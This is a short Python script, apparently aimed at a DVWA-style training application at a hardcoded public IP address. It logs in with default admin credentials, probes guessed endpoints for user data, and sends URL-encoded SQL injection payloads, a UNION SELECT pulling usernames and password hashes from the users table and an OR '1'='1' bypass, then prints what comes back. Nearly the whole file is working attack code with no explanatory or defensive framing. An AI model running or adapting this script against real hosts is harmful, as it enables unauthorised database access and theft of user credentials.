
import requests
import re

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"

# First authenticate
session = requests.Session()
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    
    # Login
    data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    
    session.post(login_url, data=data)
    
    print("[*] Searching for password hashes in the application...\n")
    
    # Check if there's a users API or data endpoint
    possible_endpoints = [
        "/api/users",
        "/api/users.json",
        "/api/users.php",
        "/data/users.json",
        "/users.json",
        "/users.php",
        "/includes/users.php",
        "/db/users.php",
    ]
    
    for endpoint in possible_endpoints:
        url = base_url + endpoint
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(f"\n[+] Found: {endpoint}")
                print(response.text[:500])
        except:
            pass
    
    # Try to access the actual SQLi vulnerability with proper encoding
    print("\n\n[*] Trying encoded SQLi payloads in sqli page...")
    
    # Use URL encoding for special characters
    encoded_payloads = [
        ("1%27%20UNION%20SELECT%20user_id,%20user,%20password%20FROM%20users--%20", "Encoded UNION select"),
        ("1%27%20OR%20%271%27=%271", "OR bypass"),
    ]
    
    for payload, desc in encoded_payloads:
        print(f"\n[*] Testing: {desc}")
        url = f"{sqli_url}?id={payload}&Submit=Submit"
        response = session.get(url, timeout=10)
        
        # Check response
        pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
        if pre_match:
            content = pre_match.group(1)
            print(f"[+] Response:\n{content[:300]}")

